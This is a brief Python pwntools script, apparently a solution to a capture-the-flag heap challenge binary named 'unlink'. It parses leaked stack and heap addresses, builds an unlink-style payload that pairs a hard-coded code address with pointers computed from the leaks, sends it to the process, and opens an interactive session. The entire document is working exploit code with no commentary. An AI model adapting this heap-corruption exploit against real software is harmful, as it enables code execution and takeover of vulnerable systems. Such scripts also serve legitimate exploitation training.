from pwn import *
 
p = process("./unlink")
 
p.recvuntil("leak: ")
stack = int(p.recv(10),16)
p.recvuntil("leak: ")
heap = int(p.recv(10), 16)

pay = p32(0x080484eb)
pay += "A"*12
pay += p32(heap+12)
pay += p32(stack+0x10)
 
p.send(pay)

p.interactive()
